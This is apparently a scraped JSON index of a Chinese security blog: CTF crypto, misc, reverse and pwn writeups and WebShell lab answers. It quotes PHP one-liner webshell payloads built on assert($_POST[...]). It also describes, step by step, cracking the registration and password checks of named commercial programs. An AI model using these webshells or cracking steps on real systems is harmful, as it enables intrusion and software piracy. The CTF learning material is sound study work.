结果"},{"title":"esp定律及大小自校验","date":"2022-01-11T13:01:00.000Z","url":"/2022/01/11/esp%E5%AE%9A%E5%BE%8B%E5%8F%8A%E5%A4%A7%E5%B0%8F%E8%87%AA%E6%A0%A1%E9%AA%8C/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":"esp定律脱壳 灰鸽子木马专杀工具破解esp定律脱壳拉od去 下一个getfilesize的断点。然后f9运行 右键在反汇编窗口中跟随过去。F2下个断点 再去b模块（断点）里把自带的断点给删除了 f9运行起来之后就来到了getfilesize的断点之后。看到他有比较。在运行几次，看到跳转就把他nop 另类脱壳复制这里的修正大小 修正镜像大小-&gt;完整转存 import rec 打开粘贴之前的大小，idt自动搜索-&gt;显示无效的-&gt;修正转储（之前转存的dump.exe）"},{"title":"破解飞扬英语一点通","date":"2022-01-11T07:27:00.000Z","url":"/2022/01/11/%E7%A0%B4%E8%A7%A3%E9%A3%9E%E6%89%AC%E8%8B%B1%E8%AF%AD%E4%B8%80%E7%82%B9%E9%80%9A/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":" 查一下壳 先随便输点数据，注册一下（肯定是失败的） ctrl+g跳到程序的开头90%的程序输401000都可以跳到程序的开头 智能搜索“未购买用户” 往上找，找到software\\engydt，注册表项。给他下个断点在启动时访问了注册表，提取了我们输入的用户名和注册码去校验，不正确就返回未购买。所以要在这里下断点 在下一个api断点，让程序在初始化之前就停下来。还没有去校验之前就去断下来。F9运行之后堆栈窗口会显示call getstartupinfo。就是断的正确的 再去点最上面那一栏的b（break），在去把初始化断点给禁用了。把encrypt的断点给激活。因为已经初始化完了，就要去encrypt了。在F9运行 f8单步多运行几次。这个时候就获取到了真的注册码 "},{"title":"破解劳保用品管理软件","date":"2022-01-11T05:50:00.000Z","url":"/2022/01/11/%E7%A0%B4%E8%A7%A3%E5%8A%B3%E4%BF%9D%E7%94%A8%E5%93%81%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6/","tags":[["re","/tags/re/"],["shark恒","/tags/shark%E6%81%92/"]],"categories":[["undefined",""]],"content":" 劳保用户管理软件输错密码的提示 跟到他这句话 找到判断跳转的地方jnz，非0时即跳转 直接nop填充掉，即可破解成功 第二个软件第二个软件也放着了吧（是个没名字的软件）同样找到密码输错跳出提示的地方 跟过去，找到他的跳转，上图是未修改的情况，下面是把Z位修改了的情况Z位修改之后，跳转实现，即不输出Password Wrong！ 我们可以修改成jmp，实现无条件跳转过去。就破解成功了"},{"title":"bugku-crypto-上篇","date":"2022-01-08T10:04:00.000Z","url":"/2022/01/08/bugku-crypto-%E4%B8%8A%E7%AF%87/","tags":[["crypto","/tags/crypto/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":" /.- 聪明的小羊 ok [+-&lt;&gt;] 把猪困在猪圈里 你喜欢下棋吗 小山丘的秘密 EN-气泡 easy_crypto 你以为是md5吗 散乱的密文 简单加密 .!? 一段base64 奇怪的密码 这不是md5 贝斯家族 告诉你个秘密 来自宇宙的信号 进制转换 抄错的字符(未写) Crack it 一段新闻 你懂我的乐谱吗？ /.- morse解密，/为空格，.为短的，-为长的。 flag{d3fcbf17f9399504} 聪明的小羊fa{fe13f590lg6d46d0d0} 普通型栅栏密码，设置两栏–》 flag{6fde4163df05d900} ok Ook to text 解密 –&gt; flag{0a394df55312c51a} [+-&lt;&gt;] brainfuck解密-&gt;flag{0d86208ac54fbf12} 把猪困在猪圈里给的文件前面没有base64头，加上base64（data:image/jpg;base64,）头。 ，在线网站转换。在用猪圈密码转换。 flag{thisispigpassword} 你喜欢下棋吗看到下课，想到棋盘密码，应该是polybius 解出来看看，thi/jsi/jspolybi/jus，自己处理一下，thisispolybius 解出来文件看到提示 一种5bit的编码。百度到博多密码 在线解密  –》bugku{baud0tc0de} 小山丘的秘密bugku的小山丘，安恒的爬坡道 。都是hill  有密钥，字母表自写  矩阵性，字母表可选（A=0,A=1） 题目提示A=1，字母表就为”ZABCDEFGHIJKLMNOPQRSTUVWXY” Z=0，A=1，B=2。再把棋盘译出来，1-2-3-0-1-4-5-6-0。用字母表转掉就是A-B-C-Z-A-D-E-F-Z。abczadefz 这一步应该就是把矩阵转成了密钥。然后就直接可以带到在线网站了。填上去解密即可 解出答案为whatahill , bugku{whatahill} EN-气泡在线解不出来，写脚本吧 中文-气泡翻译bubble，可能是bubblepy 且密文开头为x，每5个字符中间以-来分隔。 bubblepy 算法信息  解出flag为bugku{th1s_1s_A_Bubb13} easy_crypto0和1一般都是morse了。可能是因为有unicode，所以有的网站会转不出来。   flag{m0rse_code_1s_interest1n9!} 你以为是md5吗了解一下md5组成 加密完成后都是16进制的。故把题中的非16进制字符删除 bc177a7a9c7df69c248647b4dfc6fd84解密得到–》666666666666 散乱的密文描述说：lf5{ag024c483549d7fd@@1} 一张纸条上凌乱的写着2 1 6 5 3 4 开头应该是flag{开头的，判断可能位置是215643，置换密码写个脚本跑一下 分6组，每组取215643，-1是因为有0位 flag{52048c453d794df1} 最后面的@应该要自行去掉 简单加密最后两位是AA，考虑ascii码-4为=，base64编码。所有字符转成数字-4在转成ascii码。在base64解密 最后得到答案 key{68743000650173230e4a58ee153c68e8} .!?这题没想到会是Ook!，毕竟以为Ook一定要有Ook。这里面没含有。但给的附件中文件只含有.!? 有点像 Ook.Ook!Ook? 直接找个Ook！的直接解 flag{bugku_jiami} 一段base64base64-&gt;八进制-&gt;hex-&gt;unicode-&gt;ascii 奇怪的密码给了一串密文。看样式像是flag的形式，但最后多了一位，对比一下ascii可以发现。每一位相应的减去1 2 3 4就是flag。写个脚本跑一下 这不是md5给了一串字符，看着像16进制，直接拿去解。解出来就是flag 贝斯家族base家族挺大的，可以看看这篇文章 base编码家族base91最终尝试出来 告诉你个秘密给的一串像是16进制，拿去转，转完像base64，解出来。 解出来下面一串，键盘密码，围在中间。写出来就是tongyuan，大小写尝试，大写成功提交。 来自宇宙的信号提到宇宙，又是图片。对照了一下，发现银河字母中的字母跟图片比较相似。直接照着图片翻译就可。flag{nopqrst} 进制转换给了一串字符串，根据题目看如果是进制转换的。就要转换成一样的，在输出 可知b为2进制，o为8进制，d为10进制，x为16进制。写脚本转换,直接split之后存列表里。这样就能一个一个取了。然后在判断每一个的第一位是什么，之后在转成相应进制，%c输出格式化字符串 抄错的字符抄了，，，纯纯脑洞题了感觉。。。替换，and大小写？ Crack itlinux下的shadow口令。直接用john破解就可以了 一段新闻就给了一个txt文件，但中间有一大段空白，一开始没看出来是零宽字符隐写，后来看了wp。发现了是隐藏字符加密。其实隐藏字符加密就是零宽字符隐写。 vim打开文件即可看到200b，200c，200d 解密之后发现是核心价值观，找个网站解密，解出最后的flag为 你懂我的乐谱吗？不太懂了。。开局一张五线谱，剩下全靠猜把乐谱按照给的对照图翻译出来 按图写下 在把音符排列出来 排列完了之后，把排完的图和对照的图对照起来得出flag,大写提交 "},{"title":"bugku-crypto-下篇","date":"2022-01-08T10:04:00.000Z","url":"/2022/01/08/bugku-crypto-%E4%B8%8B%E7%AF%87/","tags":[["crypto","/tags/crypto/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":" affine rsa 黄道十二宫 托马斯.杰斐逊 简单的rsa 缝合加密 python_jail 这是个盲兔子,竟然在唱歌! Math&amp;English 7+1+0 给你私钥吧 11月11日是个好日子 道友不来算一算凶吉？ Double python(N1CTF) Funny Number affine了解仿射密码的原理即可做 rsa方法一： 方法二：先用wiener攻击的脚本求出d 在用c，d，n求出m 黄道十二宫开局一张图，典型的十二宫，杀手密码把图中按行列写出来原理参考 处理之后用脚本，转换排列，参考完要改不然结果是错的。因为行列之间的关系脚本参考或或师傅 在扔AZdecrypt里直接solve 托马斯.杰斐逊原理可以参考： 先通过密钥找到行数，然后在找到的行数用密文中的第一个字符H来找，找到他的位置到最后，然后提出，把他拉到前面 拿脚本直接处理 最后在倒数第六列找到flag 简单的rsa可以在线pyc或者就uncompyle6p、q、e、c都给齐了直接写脚本就出 缝合加密太套了。参考了两篇文件12 e在字母表里是第5位，就代表里面关了5只猪，在文本中关一只猪需要8个栅栏，两只猪需要10个栅栏。那5只猪就是16个栅栏了。解出来就是Wt15IR44KAJ5DTs182JdFkJGRPOuYACcJrGQvYQ2wJWNKQ0zykD1FKOVT0KEu1RBtjugYCqKnOoh5lSTUZeBX0JLh0UAGRMFzpDxPmlvR9KZQueSsUdmGltGhAXPTK1N 在看钥匙1，确实是键盘，但比划出来发现不是什么字母。看了wp发现是猪圈密码。对照着转出来去google发现跟维吉尼亚有关giovanbattistabellaso 再去维吉尼亚解密QWVzIGlzIFUyRnNkR1ZrWDEvbjZHSSs5b0J0OW41UCtEbldDOStGTDQ4NzZwcXZJdVVLbHpYWFJ5QSs1aHlZQjNUYzFlV28KS1JqM0hJQ2dQOVRhbU5EVFFsZ1Vwdz09 解出来在base64Aes is U2FsdGVkX1/n6GI+9oBt9n5P+DnWC9+FL4876pqvIuUKlzXXRyA+5hyYB3Tc1eWo KRj3HICgP9TamNDTQlgUpw== 然后在emoji解密（base100）得到key在aes解密 python_jailjail=监狱一题python的逃逸题，理应扔misc应该有什么限制。用help(flag)来绕过 这是个盲兔子,竟然在唱歌!盲文解密rabbit解密音乐符号解密 U2Fsd开头的不一定是aes Math&amp;English把每行计算出来，去转元音字母21 33 1 22 3 44 54 5 1 35 54 3 35 41 52 13 bugku&#123;yuanyinpwd&#125; 7+1+0起手是给了一串字符串4nXna/V7t2LpdLI44mn0fQ==base64解密后有的位比较奇怪，我就把第1位和第三位拿去转unicode，并与bugku的格式对比。发现相差128。写脚本处理unicode bugku&#123;7bit28bit&#125; 给你私钥吧python3 RsaCtfTool.py --publickey pubkey.pem --uncipherfile flag.enc 还有一种是factordb解n。数太大，只能去在线找 然后解出来用脚本写回去 PKCS1_OAEP是一种基于RSA和OAEP加密算法。所以就要用PKCS1_OAEP写回去脚本参考 11月11日是个好日子base套娃+affine爆破题 hint是阴阳怪气编码先套娃，alp只在最后一步用，注意数字哦 36位的仿射，这里 我其实不知道为什么是仿射，看了wp才知道 参考脚本 脚本所用原理就是，求了1-36位里的所有质数的逆元，然后b就是1-36。然后代进去算，匹配开头是flag的形式 道友不来算一算凶吉？参考链接 encrypt4就是简单加减计算，encrypt5就是仿射的加密先把密文转成易经中对应的8个二进制，然后二进制8位分割转成字符串。然后在逆encrypt4，在逆encrypt5 Double原理没看懂参考链接-1参考链接-2 python(N1CTF)未清楚原理，还是不太好写=。=参考链接-1 参考链接-2 N1CTF&#123;F3istel_n3tw0rk_c4n_b3_ea5i1y_s0lv3d_/--/&#125; Funny Number数论题。我也爬了。 "},{"title":"攻防世界-逆向-新手下篇(9 to 12)","date":"2022-01-08T09:29:00.000Z","url":"/2022/01/08/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91-%E6%96%B0%E6%89%8B%E4%B8%8B%E7%AF%87-9-to-12/","tags":[["re","/tags/re/"],["攻防世界","/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"]],"categories":[["undefined",""]],"content":" no-strings-attached csaw2013reversing2 getit maze no-strings-attachedmain里的4个函数只有一个是重要的 显然要让cmp就是比较，就是要让ws=s2，而ws是通过fgetws输入进来的，s2的生成由第六行的decrypt而来unk_8048B44在rodata段上，Success！unk_8048BA4在rodata段上，accessdenied 可以看到这边的decrypt，先准备好了wchar_t * 和s，然后直接call到decrypt的地方。然后再把eax的值赋给ebp+s2。那eax就是我们所需要的值 9447&#123;you_are_an_international_mystery&#125; csaw2013reversing2参考链接： 为了能执行到弹出flag这里 往上找到这句语句，f4运行到这里 他跳过了中间的flag，直接把他nop了 有个int 3也nop掉 又有个退出的跳转，继续nop掉 弹出了一个并不是真的flag，继续走 继续nop，看到flag getit可以选择断在循环的入口 一路调下去就可以看到flag了 还有一种是逆flag的就是看他i&amp;1的结果来判断v3的值，从而去-1还是+1 maze 这里就是判断字符数是否为24位，然后前五位是nctf{，最后一位为125(“}”) 然后就是判断行列然后去+-操作，就是上下左右了但是左右是一组，上下也是一组v10是列。那O就是左（-），o是右（+）v9是行。0就是下（+），.就是上（-） 再去把图画出来，不能碰到空格 nctf&#123;o0oo00O000oooo..OO&#125; "},{"title":"攻防世界-逆向-新手上篇(1 to 8)","date":"2022-01-07T13:34:00.000Z","url":"/2022/01/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E9%80%86%E5%90%91-%E6%96%B0%E6%89%8B%E4%B8%8A%E7%AF%87-1-to-8/","tags":[["re","/tags/re/"],["攻防世界","/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"]],"categories":[["undefined",""]],"content":" game open-source simple-unpack logmein insanity python-trade re1 Hello,CTF game定位到出flag条件的地方 直接看最后的异或操作 写脚本异或v2和v3和v5就是反汇编出来的v2和v3还有v5，这边存成txt批量处理比较方便 找到输出开始的位置，替换为跳转到输出flag的位置jmp 00a8e968 直接改完后也可以出flag open-source看脚本的最后和之前的三个参数 c0ffee simple-unpackupx -d直接脱壳 strings 文件名 | grep flag logmein RC3-2016-XORISGUD instanityida主函数打开直接往里跟就能看到flag 9447&#123;This_is_a_flag&#125; python-trade 直接逆就好了base64decode-16 ^ 32 nctf&#123;d3c0mpil1n9_PyC&#125; re1od直接智能搜索文本或者strings 文件名 | grep CTF Hello,CTF这里其实只用注意比较的是字符串常量就可以了。在比较的时候会把v10和v13转成字符串 所以把v13转成字符串输入就可以了限制了输入的长度，应该是17，然后在把输入的每一位转成16进制然后拼接起来strcat就是字符串拼接。%x就是格式化输出（十六进制小写）![Hello, CTF-1.png](Hello, CTF-1.png) ![Hello, CTF-2.png](Hello, CTF-2.png) CrackMeJustForFun "},{"title":"buuctf-misc系列2(33-48)","date":"2022-01-02T05:56:14.000Z","url":"/2022/01/02/buuctf-misc%E7%B3%BB%E5%88%972-33-48/","categories":[["undefined",""]],"content":" 被劫持的神秘礼物 刷新过的图片 snake [BJDCTF2020]认真你就输了 [BJDCTF2020]藏藏藏 被偷走的文件 [GXYCTF2019]佛系青年 菜刀666 [BJDCTF2020]你猜我是个啥 梅花香之苦寒来 秘密文件 [SWPU2019]神奇的二维码 [BJDCTF2020]just_a_rar [BJDCTF2020]一叶障目 [BJDCTF2020]鸡你太美 穿越时空的思念 被劫持的神秘礼物 这种题目，求账号密码，一般都是搜索username、password、pass、user还有就是login md5加密 刷新过的图片根据题目名，很明显可以想到f5图片隐写 然后在解伪加密 flag&#123;96efd0a2037d06f34199e921079778ee&#125; snakeforemost解压出了一个zip，zip内解压出了一个cipher和key文件key用base64解密。在根据解出的英语搜到了anaconda 去谷歌翻译snake，找到了同义词serpent 再去解密 flag&#123;who_knew_serpent_cipher_existed&#125; [BJDCTF2020]认真你就输了打开发现有问题，虽然是pk头。直接改为zip解压出来看所有的文件 在charts下找到flag.txt文件 flag&#123;M9eVfi2Pcs#&#125; 还有种把后缀修改为xlsx，就会提示是否修复，会自动修复。一样会给hint [BJDCTF2020]藏藏藏直接foremost分离了一个zip，zip解压出一个docx。扫码得flag flag&#123;you are the best!&#125; 被偷走的文件找到了个flag.rar文件，ftp-data里直接提出来 在常规爆破一下 flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125; [GXYCTF2019]佛系青年盯着图片整了半天。。。。 虽然但是。。那个没解出来的文件是伪加密，解开之后之后与佛论禅 菜刀666过滤post找到了一个图片 图片上有字符串 再在其他流里找到压缩包 拿着上面图上的字符串解压缩包 flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125; [BJDCTF2020]你猜我是个啥给了一个压缩包（不是），一张png图片。16进制最底下找到了flag 梅花香之苦寒来在jpg文件底部找到好多数字，坐标，可以python转或者gnuplot 把他转成无括号，无逗号的形式。直接扔gnuplot里plot就可 flag&#123;40fc0a979f759c8892f4dc045e28b820&#125; 秘密文件先在ftp协议里找到了下载了个rar文件，又在下面的包中发现了传输的rar文件，保存 爆破 flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125; [SWPU2019]神奇的二维码套娃小题罢了，binwalk了四个rar文件 4个rar，只涉及了base64，有个flag.doc文件，多解密几次得到密码再去解good.mp3。然后在morse读出来转 flag&#123;morseisveryveryeasy&#125; [BJDCTF2020]just_a_rar [BJDCTF2020]一叶障目 [BJDCTF2020]鸡你太美 穿越时空的思念"},{"title":"2021-深育杯","date":"2021-11-21T11:53:00.000Z","url":"/2021/11/21/2021-%E6%B7%B1%E8%82%B2%E6%9D%AF/","tags":[["ctf-比赛合集","/tags/ctf-%E6%AF%94%E8%B5%9B%E5%90%88%E9%9B%86/"]],"categories":[["undefined",""]],"content":"misc login disk bridge login文件中有一段伪加密的，zipcenop来解伪加密。 伪加密解压出一个文件和源文件来做明文攻击。crc32值相同。且是从zip文件内解出的一个，在加密，与原来的zip文件做明文攻击， 解出来密码是qwe@123 每个文件只有6个字节，尝试用crc32爆破 最后就是用vim -r来恢复文件 还有种是用bkcarck解出三个key。在用pkcrack解，未尝试 disk解压出一个奇怪的文件，根据后缀分析可能会是veracrypt加密的文件。文件名其实就是键盘密码，描出来就是pvd。zse456tfdyhnjimko0-=[;.,.vera 在加载的驱动器中在拷出东西一个没用的txt和一个没有后缀的文件 010可以看到是7z的文件，解压出来是dos的一个分区表，可以看成是windows的一个分区，磁盘。再用7z打开分出两个img 这步可以不分开，也可以根据官方wp中是直接改名vmd来解。后续都一样的 img文件是bitlocker加密的。 这边用虚拟机的linux下的hashcat是有问题。新版的hashcat会检测是不是虚拟机运行。就用windows下的hashcat，把linux下的hash.txt和字典下载下来。解出密码是abcd1234 用diskgenius解开来。在回收站里发现了hint和一个很大的文件 可以看到还是一个7z的文件，解出来直接用bmc来。根据提示来吧，file和fvp都出不来是什么文件 在把两张图拼起来 还有一种用bmc-viewer-backup解的 base64解出flag为rdpcache-bmc，套上flag格式 bridgeexif文件看到copyright有一串，给他解密掉得到一串字符串 原图lsb，bgr通道最低位可以看到有一张png 遍历像素点的时候发现，每一位的b有信息，遂提出，存为一个zip，用之前exif的密码解出一个stl的文件 再回过头来看原图的结构，idat块倒数第二块没填满就进入了下一块，判断最后一块是添加进去的 提出最后一个idat块，从指向的位置开始提，去掉前面的idat块标识，最后的png文件结尾不要提取，最后在存起来。脚本给他解出来，zlib解密 得到一个rar文件（flag2）”如果你不知道这是什么东西，可以去看看flag1!”，提示看解出一个没有后缀的文件。判断也是stl文件。解两个stl文件 3d文件，打开两个文件 拼起来得到flag flow hunter"},{"title":"buuctf-misc系列2(17-32)","date":"2021-11-19T06:26:00.000Z","url":"/2021/11/19/buuctf-misc%E7%B3%BB%E5%88%972-17-32/","tags":[["misc","/tags/misc/"],["buuctf-misc","/tags/buuctf-misc/"],["buuctf","/tags/buuctf/"]],"categories":[["undefined",""]],"content":" ningen 小明的保险箱 爱因斯坦 easycap 另外一个世界 隐藏的钥匙 FLAG 假如给我三天光明 神秘龙卷风 后门查杀 数据包中的线索 荷兰宽带数据泄露 来首歌吧 webshell后门 面具下的flag 九连环 ningenbinwalk分离jpg文件，得到压缩包。根据描述爆破4位数字直接出 flag&#123;75a3d68bf071ee188c418ea6cf0bb043&#125; 小明的保险箱binwalk分离jpg文件，得到压缩包。根据描述爆破4位数字直接出 flag&#123;b025fc9ca797a67d2103bfbc407a6d5f&#125; 爱因斯坦binwalk分离jpg文件，得到压缩包。在到图片的描述里找到密码，解压出flag flag&#123;dd22a92bf2cceb6c0cd0d6b83ff51606&#125; easycap直接追第一个包就看到flag了 flag&#123;385b87afc8671dee07550290d16a8071&#125; 另外一个世界末尾看到2进制数，转成asciiflag&#123;koekj3s&#125; 隐藏的钥匙010editor里直接搜flag。搜到一串bsae64加密的。在unknownpadding块里 flag&#123;377cbadda1eca2f2f73d36277781f00a&#125; FLAGlsb低位隐写，stegsolve查看没特征，上zsteg发现zip file 提出来发现文件损坏，不过也可以解压 假如给我三天光明对照盲文表翻译出来解密kmdonowg wav明显的morse翻译出来的CTFWPEI08732null23DZ，转小写，在把前面的ctf变成flag flag&#123;wpei08732?23dz&#125; 神秘龙卷风爆破出密码5463 brainfuck网站，多找几个试试。有的网站解不出来; 后门查杀d盾扫一下，找到密码。flagflag&#123;6ac45fb83b3bc355c024f5034b947dd3&#125; 数据包中的线索http里找到base64的图片，转回来 荷兰宽带数据泄露bin文件，可以尝试用routerpassview打开。看user和pass 来首歌吧audacity打开，moese翻 flag&#123;5BC925649CB0188F52E617D70929191C&#125; webshell后门d盾扫一波有又是pass flag&#123;ba8e6c6f35a53933b871480bb9a9545c&#125; 面具下的flagbinwalk分离出zip，伪加密的zip。分出一个vmdk文件，windows下7zip可以直接打开看，但这题只能linux下使用7z。因为这边linux下7z可以直接还原出ntfs的文件，但windows下解压出来是没有ntfs流文件的。 一串ook，一串brainfuck解密出来，两串拼进去flag&#123;N7F5_AD5_i5_funny!&#125; 九连环常规binwalk分出文件。又是一个伪加密，分出一张jpg和zip（带锁）。jpg16进制下无信息，尝试常规加密工具。steghide尝试出空密码解压出ko.txtflag&#123;1RTo8w@&amp;4nK@z*XL&#125; "},{"title":"2021第四届浙江省大学生网络与信息安全竞赛预赛writeup记录","date":"2021-11-05T09:10:00.000Z","url":"/2021/11/05/2021%E7%AC%AC%E5%9B%9B%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%A2%84%E8%B5%9Bwriteup%E8%AE%B0%E5%BD%95/","tags":[["ctf-比赛合集","/tags/ctf-%E6%AF%94%E8%B5%9B%E5%90%88%E9%9B%86/"]],"categories":[["undefined",""]],"content":"misc听说你在找flag？参考：1.或者010搜50 4b 03 04分出最上面一个zip 预期的解应该是根据压缩包的提示找 apng的delay知识然后在找到他的帧块数，从0数到10。就是1080，在重复两次就是10801080 爆破zip文件包。爆破应该就是非预期的解了10801080找到压缩包里最大的图片 往后看，有base64 扔CyberChef里。保存成png图片 其他块无问题。尝试修改高度 图片里的base64抄下来，继续扔进去解密。 拿着上一步的密码去解rar的文件 qrimg再次参考大佬的脚本1. 脚本的原理就是打开每张图片，在来取出blue通道的最低图片，用黑白填充。最后在pyzbar解码 reversecrackPYC这边主要的参考文章： 1. 2. 3. 把python的字节码翻译成python语言。这块翻译的是文件下半部分针对key的处理 这一块就是针对key和data出最后flag的操作把文件翻译成字节码。方便自己查看。python2 -m dis exp.py 最后的脚本就如下了，抄自0rays-wp 还有一种应该是把文件分成了两个来解读，先算出了key 再把key带回计算得到flag cryptoEasy Railfence直接爆破offset和key的 改自0rays的脚本，前面都是一样的，就是给了m，然后循环x和y。根据生成后的字符串来控制了两个括号位置的约束。跑出的后面应该也是括号位置相同？ webcheckin直接抓包，看response，头部有flag"},{"title":"墨者学院-WebShell代码分析溯源系列全解（writeup）","date":"2021-09-19T13:02:00.000Z","url":"/2021/09/19/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-WebShell%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90%E7%B3%BB%E5%88%97%E5%85%A8%E8%A7%A3%EF%BC%88writeup%EF%BC%89/","tags":[["墨者学院","/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"]],"categories":[["undefined",""]],"content":"19年的时候在墨者上面刷的，全扔笔记软件里了。现在还是写出来存blog里 WebShell代码分析溯源(第1题) WebShell代码分析溯源(第2题) WebShell代码分析溯源(第3题) WebShell代码分析溯源(第4题) WebShell代码分析溯源(第5题) WebShell代码分析溯源(第6题) WebShell代码分析溯源(第7题) WebShell代码分析溯源(第8题) WebShell代码分析溯源(第9题) WebShell代码分析溯源(第10题) WebShell代码分析溯源(第11题) WebShell代码分析溯源(第1题)代码审计就掏出seay 一顿扫就完事了使用旧版菜刀连接 WebShell代码分析溯源(第2题)seay分析到这里 直接写$array[0]直接弹出报错，加上[‘POST’]就成功弹出assert 语句合起来就是 连接 WebShell代码分析溯源(第3题)seay又是一顿扫，审计一下源码，就是把一句话变形了 看到$gg就是把几个东西连接了起来$g[1]就是s,chr(‘116’)就是t phpinfo验证可以 连接起来就是assert assert($_POST[get]);直接一句话木马尝试 WebShell代码分析溯源(第4题)seay没跑出来。。 手翻bin.php一句话变形php回调函数类一句话木马array_filter assert加密后YXNzZXJ0array_filter()函数用回调函数过滤数组中的值。这样回调函数名就是assert，构成一句话木马 assert($_POST[‘密码’])直接菜刀连 base64_decode($_REQUEST[&#39;e&#39;])($_POST[&#39;POST&#39;]); WebShell代码分析溯源(第5题)还是没出来，手审吧。回调函数，别问这么多。。 WebShell代码分析溯源(第6题)seay又没跑出来 直接找吧 涉及到了回调函数array_map 和之前有题如出一辙吧，传e为加密后的，菜刀连接 密码POST，拿到key WebShell代码分析溯源(第7题) uasort实例这题文件不难找，主要就是理解uasort函数的用法这里又涉及到了回调函数assert与$_REQUEST[‘POST’]构成了一句话木马。传入的assert经base64加密后通过菜刀连接，拿key WebShell代码分析溯源(第8题)通过对一些常用的变量传值进行查找，找到 WebShell代码分析溯源(第9题)自动审计没找到，就全局搜索REQUEST吧 WebShell代码分析溯源(第10题) 主要是register_tick_function和declare函数这两个函数通常都是一起使用的 ticks代表事件，次数,register_tcik_funtion用来指定tick的事件传入assert,$_REQUEST[‘GET’]，在此构成了一句话木马，直接连接密码GET,直接连接 WebShell代码分析溯源(第11题)代码回炉一下 str_replace直接替换把ert替换为vey,把ass替换为ilo，所以直接用替换完的去代替。assert($_POST[1])一句话木马 菜刀直接连，拿key总体思路是先满足mysql_conn.php的要求生成t.php，之后通过菜刀连接绕过过滤拿key "},{"title":"墨者学院-主机安全类全解（writeup）","date":"2021-09-18T09:29:00.000Z","url":"/2021/09/18/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E7%B1%BB%E5%85%A8%E8%A7%A3%EF%BC%88writeup%EF%BC%89/","tags":[["墨者学院","/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"]],"categories":[["undefined",""]],"content":"19年的时候在墨者上面刷的，全扔笔记软件里了。现在还是写出来存blog里 Ubuntu16.04漏洞复现(CVE-2017-16995) WEB站点访问者身份识别 用户终端环境识别 主机溢出提权漏洞分析 IIS写权限漏洞分析溯源 Ubuntu 16.04漏洞复现(CVE-2017-16995)连上去 WEB站点访问者身份识别直接访问robots.txt文件,是告诉搜索引擎是否可以抓取以及收录 可以看到Bingbot下面的Disallow没有/,说明这是唯一可以允许搜索引擎爬取的UA 用户终端环境识别打开要求直接抓包改包一条龙 修改完成即可获得key 主机溢出提权漏洞分析32位的cmd.exe下载地址: 拦包改位置，直接放行 菜刀连接上传文件直接getkeycmd.exe上传到那里，就设置到那里，先设置终端路径之后通过pr.exe，直接查看key IIS写权限漏洞分析溯源这里一开始搞了很久都没成功，后来把所有的都删了，自己写了进去。带上了请求头和请求正文就开始自己写了。给的UA cookie全清了。直接写一句话木马不行。就尝试先写。访问也是404。由于服务器未勾选上”脚本资源访问”，所以之后就无法move了 但写了txt,然后就可以了。这是iis6.0的畸形漏洞。在;后面的都被忽略，当成asp文件直接进行执行 菜刀里面验证两个文件的内容应该是一样的 "},{"title":"Basic-ROP","date":"2021-09-13T03:41:00.000Z","url":"/2021/09/13/Basic-ROP/","tags":[["pwn","/tags/pwn/"]],"categories":[["undefined",""]],"content":" ret2text ret2shellcode ret2syscall ret2libc-1 ret2libc-2 ret2libc-3 ret2text原理ret2text 即控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是 gadgets)，这就是我们所要说的ROP。 file和checksec，看看文件类型和开了什么保护。开了NX保护，栈不可执行保护=。= 查看到main里有个gets函数，可能存在栈溢出漏洞 找到/bin/sh，因为是rodata是只读的，要找到在程序中的位置，往里跟进去，找到了在text段上的地址 一种通过下断点的方式来计算偏移。这边没截图，下完断点后直接run就可以了 可以看到esp的值是0xffffd000，ebp的值是0xffffd088。根据s相对于esp的索引是[esp+80h+s]。计算出s是0xffffcf80。在计算s相对于ebp的偏移是0x6c。在加上返回地址。最后的结果就是0x6c+4=十进制下的112。这种方法也是wiki里的计算方法。 run起来，用脏数据填充掉。这边是用cyclic来计算偏移 直接上脚本跑，就成功getshell ret2shellcode原理 checksec检查一下保护和看一下文件的类型 gets基本的栈溢出，还将字符串复制到了buf2。查看一下buf2字段在bss段 下断点在main，运行起来，用vmmap来查看buf2所在的段是否可执行查看到地址在图中框起来的地方，且有可执行权限 ret2syscall原理 file和checksec文件ida查看伪代码 cyclic寻找偏移 在这个程序里，没有我们可以直接利用的代码段，就要通过程序中的gadgets来获得shell获得shell需要一个系统调用的过程 在这里我们需要做的就是调用execve(“/bin/sh”,NULL,NULL)这个程序就让eax=0xbebx=/bin/sh的地址ecx=0edx=0最后就是让栈顶的值为0xb，然后直接pop eax就获得了shell 通过ROPgadget来寻找gadgets 原理参见图： ret2libc-1file和checksec文件 ROPgadget找/bin/sh字符串 通过cyclic找偏移 ret2libc-2这题只给了system函数，没有/bin/sh字符串，要通过gets函数写到一个可读可写的地方，一般选择bss段。然后去执行/bin/sh file和checksec文件 vmmap查看bss段是否可写可读 cyclic计算偏移 system和gets在plt里的地址 